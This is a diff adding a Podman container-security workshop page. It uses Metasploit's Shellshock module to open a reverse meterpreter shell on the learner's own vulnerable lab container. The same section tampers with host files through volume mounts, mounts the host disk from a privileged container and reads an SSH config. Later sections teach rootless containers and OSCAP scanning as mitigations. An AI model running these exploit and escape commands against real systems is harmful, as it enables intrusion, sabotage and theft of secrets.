@@ -1,0 +1,751 @@
+include::ROOT:page$_attributes.adoc[]
+
+= Container Security
+
+If you looking to run containers in any kind of production capacity, simply knowing _how_ to run a container is not enough.  Ensuring that the container is _secure_ is as critical as making sure any production facing infrastructure is secure.
+
+Sometimes people can be lulled into a false sense of security around containers because of the sense that they are isolated from the host (e.g. VM). However, in the previous sections we made allowances to get our containers up and running, some of which xref:podman-intro.adoc#security_vuln[we highlighted previously].
+
+[#exploit_containers]
+== Exploiting Vulnerable container
+
+In order to get a sense of how consequential these security exploits can be, let's exploit some of the issues in the containers we already have running
+
+image:shellshock-logo.png[role=right,width=50]
+Our `{apache-server-image-insecure}` has a huge vulnerability in it that is further excerbated by the manner in which we've run our container.  The vulnerability is the (in)famous link:https://en.wikipedia.org/wiki/Shellshock_(software_bug)[Shellshock vulnerability^] 
+
+. First ensure the `{apache-committed-container-image}` is running by running the following command in the terminal
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+podman ps
+----
++
+. You should see output something like below.  If you don't, then run the container as per link:container-persistence.html?USER={USER}&CLUSTER_SUBDOMAIN={CLUSTER_SUBDOMAIN}#podman_run_httpd[here^]
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+include::partial$podman_ps.adoc[]
+----
+
+[#using_metasploit]
+=== Using Metasploit
+
+We're going to use a tool called link:https://www.metasploit.com/[metasploit] (which has already been installed on your VM instance) to exploit the vulnerability (with frightening ease).  
+
+. We are going to run metasploit as a non-root user in another shell.  Split your terminal to open a new, non-root, shell
++
+.Terminal Split button
+image::terminal-split.png[]
++
+. Next, start up metasploit in your terminal by running the following command:
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+msfconsole \
+    -x \#<.>
+"use multi/http/apache_mod_cgi_bash_env_exec; #<.>
+set RHOST 127.0.0.1; #<.>
+set RPORT 8081; #<.>
+set LHOST $(dig +short myip.opendns.com @resolver1.opendns.com); #<.>
+set targeturi /cgi-bin/log-visitor.sh" #<.>
+----
+<.> The `-x` option allows us to pass commands directly into metasploit (see following explanations of each).  We use this to save setup time
+<.> This is a metasploit module that plugs into the console.  There is a whole library of modules that are used with metasploit.  This one specifically targets the shellshock vulnerability via Apache's cgi-bin support
+<.> This is the address of the server (which we're running locally in a container)
+<.> The port the container is listening on (in our case the port that is forwarded to the container via the `-p` option to `podman run`)
+<.> The public ip address of the VM instance (as reported by `dig`).  This is necessary for how metasploit works
+<.> The target URL of a cgi-bin script.  Those that are astute might recognize this as the cgi-bin endpoint of the guestbook page (`hello.html`)
++
+[NOTE]
+====
+If asked if you want to setup a new database, answer no
+
+----
+Would you like to use and setup a new database (recommended)?
+----
+====
++
+. When it's done initializing, you should see output something like this (ASCII art, "tip", and LHOST will vary)
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+include::partial$metasploit_output_initial.adoc[]
+----
++
+. To ensure we've got everything right, we can check whether our setup is currently targeting a vulnerable container
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+check
+----
++
+. Which should report the following output if successful: 
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+[+] 127.0.0.1:8081 - The target is vulnerable.
+----
+
+[#exploit_shellshock]
+=== Exploiting Shellshock
+
+. Now it's time to exploit our running container.  This is as simple as running the following inside the metasploit console (it causes the `multi/http/apache_mod_bash_env_exec` module to be run with the configuration we set up in the previous section)
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+exploit
+----
++
+. After a few moments you should see the following output, ending with the a `meterpreter` console
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+
+[-] Handler failed to bind to 13.239.27.229:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (984904 bytes) to 13.239.27.229
+[*] Meterpreter session 1 opened (172.16.249.211:4444 -> 13.239.27.229:42046) at 2021-05-30 07:31:45 +0000
+
+meterpreter > 
+----
++
+. Next type in the following to get a shell and output something like the following
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+shell
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+Process 79 created.
+Channel 1 created.
+----
++
+. And finally to make us maximally confortable during our hack, we can create a full `bash` shell experience by running this command
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+/usr/bin/script -qc /bin/bash /dev/null
+----
+
+[#wreaking_havoc]
+=== Wreaking havoc from within the container
+
+Now that we're in the container, let's show the kind of vulnerabilities we've exposed.  
+
+. First, notice the user we're running as: 
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+whoami
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+root
+----
++
+. So we're running as the `root` user inside the container.  This is because we ran our container as root and setup our apache server to run as whichever user started the `httpd` process (in this case, `root`).
+. Now let's take a look at where we are in the container by issuing these two commands and reviewing the output (yours might vary slightly):
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+pwd && ls -l
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+/var/www/cgi-bin
+total 4
+drwxr-xr-x. 1 root root  28 May 28 03:24 .
+drwxr-xr-x. 1 root root  18 May 17 15:31 ..
+-rwxr-xr-x. 1 root root 452 May 28 03:24 log-visitor.sh
+----
++
+. This is the script that logs visitors in our guestbook.  And notice that as root we have access to this script.  Feel free to look at the script 
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+cat log-visitor.sh
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+include::example$log-visitor.sh[]
+----
++
+. Notice that the logbook directory is specified in the shell script.  We'll go there next.  But in the meantime we can damage the container by deleting the script
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+rm -f log-visitor.sh
+----
++
+. Now if you try to enter your name in the guestbook at the following URL (`http://localhost:8081/hello.html` in the *Preview Browser*) you'll now get an error
++
+[NOTE]
+.Ability to impact or sabotage running container
+====
+So far we've just impacted the running container.  To fix it we could just startup a new one.  But the vulnerabilities don't end there
+====
++
+image::broken-guestbook.png[]
+
+[#wreaking_havoc_host]
+=== Wreaking havoc on the Host
+
+One key consideration when running containers as a given user is that this generally maps directly to a user on the host operating system.  As we'll see, this is particularly dangerous for a user such as `root` which exists on every system and has elevated privileges.  One of the places of "interaction" between the container and the host operating system where we can exploit this is via the *volume mounts* we were using
+
+. From within the same metasploit shell, let's poke around the directory where visitors were getting logged
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+cd /var/log/www && ls -l
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+total 8
+-rw-r--r--. 1 1001 1001 73 May 28 08:50 README.md
+drwxr-xr-x. 2 1001 1001 22 May 28 08:50 cgi-bin
+drwxr-xr-x. 2 1001 1001 29 May 28 08:50 oval
+drwxr-xr-x. 2 1001 1001 34 May 28 08:50 sql
+-rw-r--r--. 1 root root  5 May 30 07:31 visitor_info.txt
+----
++ 
+. This is particularly concerning as you'll notice that this mirrors the files you see in the `container-workshop` directory of your host (as you can verify from the **Explorer**).  What's worse is that you are `root` so you can mess with stuff now in this directory (and below) of *the host system*.  For instance, enter the following commands
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+chown root README.md && chmod 700 README.md
+echo "You've been hax0red" >> visitor_info.txt && chmod a+w visitor_info.txt
+----
++
+. Now try to open README.md from your Explorer window and you'll see the following error in the *bottom right corner* of the VSCode Server window
++
+image::readme-error.png[]
++
+. If it's not open already, open the visitor_info.txt from the **Explorer**.  It will now look something like this: 
++
+image::hax0red.png[]
++
+[NOTE]
+.Access to host filesystem via volume mounts
+====
+This demonstrates that a malicious intruder could actually read and change files on the host system, provided access was afforded them through our volume mounts.  But it gets even worse in this case because of our use of the `privileged` flag.  This gives the container OS level capabilities, which we'll exploit to potentially devestating effect next
+====
++
+. Enter the following command to look at the disks(!) on the host operating system
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+fdisk -l
+----
++
+. The output you should see from the command is from the _host operating system_
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+WARNING: fdisk GPT support is currently new, and therefore in an experimental phase. Use at your own discretion.
+
+Disk /dev/xvda: 21.5 GB, 21474836480 bytes, 41943040 sectors
+Units = sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disk label type: gpt
+Disk identifier: 2E431796-24CD-41A3-A4CB-7987FFF67072
+
+
+#         Start          End    Size  Type            Name
+ 1         2048         4095      1M  BIOS boot       
+ 2         4096     41943006     20G  Linux filesyste 
+----
++
+. And now we can mount the root of the host filesystem by creating a directory and simply mounting the device at that directory
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+mkdir /mnt/hack
+mount /dev/xvda2 /mnt/hack
+touch /mnt/hack/hax0red.txt
+----
++
+. From within the container, validate that you're at the top of the host filesystem by issuing a `tree` command, you should see the whole of the VMs contents scroll by
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+cd /mnt/hack && tree
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+.
+|-- bin -> usr/bin
+|-- boot
+|   |-- System.map-4.18.0-305.el8.x86_64
+|   |-- config-4.18.0-305.el8.x86_64
+|   |-- efi
+|   |   `-- EFI
+|   |       `-- redhat
+|   |-- grub2
+|   |   |-- device.map
+|   |   |-- fonts
+|   |   |   `-- unicode.pf2
+|   |   |-- grub.cfg
+|   |   |-- grubenv
+|   |   `-- i386-pc
+|   |       |-- acpi.mod
+|   |       |-- adler32.mod
+|   |       |-- affs.mod
+|   |       |-- afs.mod
+|   |       |-- ahci.mod
+|   |       |-- all_video.mod
+|   |       |-- aout.mod
+|   |       |-- appended_signature_test.mod
+...
+    |-- spool
+    |   |-- anacron
+    |   |   |-- cron.daily
+    |   |   |-- cron.monthly
+    |   |   `-- cron.weekly
+    |   |-- cron
+    |   |-- lpd
+    |   |-- mail
+    |   |   |-- ec2-user
+    |   |   `-- student1
+    |   `-- rhsm
+    |       `-- debug
+    |-- tmp
+    |   |-- cloud-init
+    |   |-- systemd-private-7dde33fba5c24ce9b2cf87368937522d-chronyd.service-iti2eg
+    |   |   `-- tmp
+    |   `-- systemd-private-7dde33fba5c24ce9b2cf87368937522d-nginx.service-NWeHPh
+    |       `-- tmp
+    `-- yp
+----
++
+. And from the left (VM) terminal, run the following command to show that a new file has been created on the host from within the container
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+ls -l /
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+include::example$hacked_root.txt[]
+----
++
+. And finally, this means that any secrets on the host are exposed or manipulatable by the intruder.  For example, run the following from the *metasploit* terminal:
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+cat /mnt/hack/home/{USER}/.ssh/config
+----
+
+== Running containers responsibly
+
+Following the link:https://en.wikipedia.org/wiki/Principle_of_least_privilege[principle of least privilege^], there is a lot we could have done to limit the damage of any attacker such as:
+
+* don't run privileged containers
+* use SELinux to fine tune container access to volume mounts
+* don't run containers as root
+* ensure that your containers do not include known vulnerabilities or CVEs
+
+=== Effect of priviledged containers
+
+Let's take a look at the difference that is made by not running containers in privileged mode.  
+
+. Stop and remove the currently running web server
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+podman rm -f {apache-server-container-name}
+----
++
+[NOTE]
+====
+When you kill the container, you'll notice that the metasploit connection will be broken and you'll see a message like this: 
+
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+[*] 127.0.0.1 - Meterpreter session 2 closed.  Reason: Died
+----
+
+Press enter in that terminal to return to the metasploit console
+
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > 
+----
+
+====
++
+. Now let's start up the webserver again in the same manner as before but this time _without the `--privileged` flag_
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+podman run \
+    -d \
+    -p 8081:80/tcp \ 
+    --name {apache-server-container-name} \
+    -v {container-workshop-exercise-path}:/var/log/www:Z \
+    {apache-server-image-insecure}
+----
++
+. Let's reopen the exploit in the other terminal by entering following the instructions link:#exploit_shellshock[above^] to create a bash terminal on the container 
+. Many of the exploits that we did previously are still an issue, but the arguably most egregious one, mounting the host's root filesystem is gone.  From the metasploit bash script run
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+fdisk -l
+----
++
+. Unlike before you will see that no disks are returned.  
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+
+----
++
+. This is because such privileges were not assigned to the container
+
+=== Better use of SELinux
+
+[WARNING]
+====
+This section is _UNFINISHED_, please move on to the <<Non-root containers,next one>>
+====
+
+
+When our container is running on Red Hat Enterprise Linux, we can use Security Enhanced Linux (or SELinux) to further control the container's access to files on our volume
+
+[#non_root_containers]
+=== Non-root containers
+
+Most containerization runtimes, such as Docker, effectively require all containers to run as root by way of the Docker daemon on the system. 
+
+Podman is different in that regard.  Because it does not rely on a root-level service to be active to be able to run a container, containers can instead be run as normal users on the system.  How it does this is a bit beyond the scope of this workshop, but in short it does this through linux user namespace mapping.  When running as a non-root user on the host system, any container that is setup to run as root (like our apache container) will present instead as the user who started the container to the host system.  This can further limit exposure of the host system.  Let's try this out.
+
+. First, before we do anything else, be sure to shutdown the currently running container
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+podman rm -f {apache-server-container-name}
+----
++
+. For most of the lab we have been running as the `root` user.  Let's get to a terminal that is running as {USER}.  Choose one of the ways below:
++
+[tabs]
+====
+Exit `sudo`::
++
+--
+From the terminal that you have been running all your podman commands, simply type the following to exit back to your original user
+
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+exit
+----
+
+Upon running the command, you should still have an open and active terminal, returning you to the default user
+
+--
+Open new Tab::
++
+--
+Click the `+` button as shown in the image below to create a new terminal.  
+
+image::new-terminal.png[]
+
+TIP: You can also open a new terminal with the kbd:[CTRL+SHIFT+'] keystroke
+
+This will add a new terminal to your "stack" and log you as as {USER}.  You can always go back to your other terminals by using the terminal dropdown as shown
+
+image::terminal-dropdown.png[]
+--
+====
++
+. Check to ensure you are no longer the root user in the terminal by running the following command
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+whoami
+----
++
+. Ensure that the output of the command is the following:
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+{USER}
+----
++
+[TIP]
+====
+If it's not, ensure you followed the instructions <<non_root_containers,here>> correctly or ask for assistance.
+====
++
+. Now we'll run our webserver much like we did before but this time as a non-root user
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+podman run \
+    --privileged \#<.>
+    -d \
+    -p 8081:80/tcp \ 
+    --name {apache-server-container-name} \
+    -v {container-workshop-exercise-path}:/var/log/www:Z \
+    {apache-server-image-insecure}
+----
+<.> Despite what we learned in the previous sections about the risks inherent in running with `--privileged` we are going to use that flag again when running the container rootlessly.  You'll see soon why this is OK
++
+[NOTE]
+====
+You will notice that the container needs to be downloaded again.  Didn't we do this already?  We did, but as `root`.  Each user keeps their own local container storage separate from all other users.
+====
++
+. Let's once again reopen the exploit in the other terminal by entering following the instructions link:containers-and-security.html?USER={USER}&CLUSTER_SUBDOMAIN={CLUSTER_SUBDOMAIN}#exploit_shellshock[above^] to create a bash terminal on the container 
+. Then from metasploit shell, run the following command
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+touch /var/log/www/hello_from_rootless_podman.txt
+----
++
+[NOTE]
+====
+When you create the file, you should see a file appear in the `container_workshop` in the explorer
+====
++
+. The the metasploit shell, run the following command to look at the permissions of the file
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+ls -l /var/log/www/hello_from_rootless_podman.txt
+----
++
+. It should appear that the files are created by root
++
+[.console-output]
+[source,bash,subs="+macros,+attributes,+quotes"]
+----
+-rw-r--r--. 1 #root# #root# 0 Jun 14 13:25 /var/log/www/hello_from_rootless_podman.txt
+----
++
+. This makes sense as you are still running in the container as root.  Prove this by running
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+whoami
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+root
+----
+. The noteworthy part is what we see on the *host* filesystem.  From the other shell, let's take a look at the file we created (that recently appeared in the explorer)
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+ls -l {container-workshop-exercise-path}/hello_from_rootless_podman.txt
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes,+quotes"]
+----
+-rw-r--r--. 1 #student1# #student1# 0 Jun 14 13:25 /home/student1/container-workshop/hello_from_rootless_podman.txt
+----
++
+. The key here is that unlike before, the files on the host were created as `{USER}`, that is, the user that ran the `podman` command and not `root` as it appeared from inside the container
+
+Podman is able to accomplish this through "namespacing" and mapping container UIDs to different UIDs on the host.  Any container running as `root` when running as rootless podman will always present to the host (such as via volume mounts) as the user that ran the rootless podman command in the first place.
+
+This affords an additional layer of security as even containers that think they are running as root are not actually running with such privileges on the host
+
+Finally, remember how we ran this container with the `--privileged` flag even though we know that it confers extra powers to the container?  Let's try our `fdisk` trick again
+
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+fdisk -l
+----
+
+But this time it will appear as if we had not run with the `--privileged` flag at all:
+
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+
+----
+
+This is again due to the fact that the container is not actually running as root on the host system, it is running as {USER} and {USER} does not have permissions to run `fdisk` normally.  Hence rootless containers afford additional layers of security on top of the ones we indicated already
+
+[#scanning_containers]
+== Scanning Containers
+
+In the previous section we saw some techniques podman (Red Hat Enterprise Linux) give us to limit the impact of any *unknown* security vulnerabilities, but is there a way we can actively look for vulnerabilities and ensure they are not part of our containers in the first place?
+
+In this section we'll look at one form of container security scanning based on OSCAP.  We'll use our container (which clearly has security vulnerabilities) as a target of our OSCAP scan and let's see what turns up
+
+=== Vulnerability Scanning with `oscap-podman`
+
+The link:https://static.open-scap.org/openscap-1.2/oscap_user_manual.html[Open Security Content Automation Protocol^] (or OSCAP) refers to an open standard for quantifying vulnerabilities (or security policy infringements) that may be present in an operating system.  The aggregated wisdom of all the Common Vulnerabilities and Exploits (CVEs) are codified in publicly available xml documents in the link:https://oval.mitre.org/[OVAL^] (Open Vulnerability and Assessment Language) xml format which oscap tooling can consumefootnote:[For policy checking, there is a separate type of format that OSCAP tooling can consume called EXensible Configuration Checklist Description Format (or XCCDF) files.  XCCDF files are used to can images/operating systems for compliance with a number of prescritive standards such as CIS and PCI-DSS]
+
+One of podman tools is an oscap compatible scanner, called `oscap-podman` which adapts oscap for use with containers instead of just operating systems.
+
+. To save time, we have provided you with a suitable oval document already.  Let's take a quick look at it by using kbd:[CTRL+p] (or kbd:[CMD+p] on MacOS) to quickly open `rhel-7-oval.xml` (which can be found in the `container-workshop\oval` directory on your instance)
++
+.OVAL document
+image::oval-document.png[OVAL document]
++
+[NOTE]
+====
+If you want to look at an oval document direct from the internet you can run the following command: 
+
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+wget -O- https://www.redhat.com/security/data/oval/v2/RHEL8/rhel-8.oval.xml.bz2 | bzip2 --decompress> ~{USER}/container-workshop/rhel-8.oval.xml
+----
+
+====
++
+. With our oval document in hand, we simply run the scan on our image
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+sudo oscap-podman {apache-server-image-insecure} \#<.>
+    oval eval \#<.>
+    --report /home/{USER}/container-workshop/oval/vuln-report.html \#<.>
+     /home/{USER}/container-workshop/oval/rhel-7.oval.xml #<.>
+----
+<.> The oscap-podman command must run as `root` due to the container evaluation itself needing elevated privileges.  Hence we use the `sudo` prefix
+<.> This indicates that we are wanting to evaluate the document using the `oval` format (as opposed to XCCDF)
+<.> This is the location of the oval document we just viewed in VS Code
+<.> Indicates that we want the output as an (HTML) report in the specified directory
++
+[IMPORTANT]
+====
+In order for `oscap-podman` to be able to scan an image, it must already be present locally on the machine (for the `root` account) or you will get errors like
+
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+Target of the scan not found: '{apache-server-image-insecure}'.
+----
+
+If you get this error, first run this command before running the `oscap-podman` command above
+
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+sudo podman pull {apache-server-image-insecure}
+----
+====
++
+. The command might appear to do nothing for 30 seconds or so, but then you should see a flood of output somthing like this (showing only the last few lines): 
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+...
+Definition oval:com.redhat.rhba:def:20152194: false
+Definition oval:com.redhat.rhba:def:20152161: false
+Definition oval:com.redhat.rhba:def:20152142: false
+Definition oval:com.redhat.rhba:def:20152116: false
+Definition oval:com.redhat.rhba:def:20152092: false
+Definition oval:com.redhat.rhba:def:20151554: false
+Definition oval:com.redhat.rhba:def:20150965: false
+Definition oval:com.redhat.rhba:def:20150584: false
+Definition oval:com.redhat.rhba:def:20150441: false
+Definition oval:com.redhat.rhba:def:20150386: false
+Definition oval:com.redhat.rhba:def:20150364: false
+Evaluation done.
+----
++ 
+. The report `vuln-report.html` should have appeared in your `container-workshop` directory of your explorer.  To look at it from within the browser preview, right click on the file and select `Open in Browser Preview`
++
+.Open report in preview
+image::open-report-in-preview.png[Open in preview]
++
+. On the right side of the screen, you should now see the generated report (as also seen in the image below).  Feel free to scroll around to get familiar with the output.  This report shows how our container fared against the different vulnerability checks and in our case indicates one big security issue.
++
+[TIP]
+====
+You can double-click on the browser preview tab to expand that pane.  Double-click again to bring it back to the original size
+====
++
+. Let's go a little deeper into the vulnerability that this oval scan uncovered.  Included in the scan output is helpful information about what the vulnerability is, how it's exploited, and how it can be resolved.  Click on link shown in the image below to learn more
++
+.OSCAP Vulnerability Report
+image::oscap-vulnerability-report.png[Vulnerability Report]
++
+. Your `Browser Preview` should navigate to Red Hat's CVE information on the exploit which, in this case, is the famous Shellshock vulnerability that we have been expoiting on our container for most of this lab.
++
+[TIP]
+====
+When clicking on the link, a new Browser Preview will open in a new tab.  This may clutter up your workspace.  If you'd like, you can close the Browser Preview with the vulnerability report and/or double-click on the Browser Preview tab with the Red Hat CVE info.
+====
++
+. Feel free to read through the advisory.  To determine how to fix the issue we're going to follow the "Vulnerability Response" link highlighted below
++
+.Red Hat advisory on Shellshock CVE
+image::cve-advisory.png[]
++
+. Once on the security bulletin, select the "Resolve" tab as shown below.  From this we can see that the recommended remediation is to update the version of bash that is running in our container to `bash-4.2.45-.el7_0.4`
++
+.Security Bulletin with Shellshock remediation
+image::security-bulletin.png[]
+
+Now that we know what we need to do to our container, we're left with the question of HOW we're meant to update the container given that containers are supposed to be immutable.  When dealing with containers, we don't need to change the running container, but rather the _image_ that the container runs as.  In our case we're going to want to update our `{apache-server-image-insecure}` image.
+
+This is where `buildah` comes in, which we'll explore next.
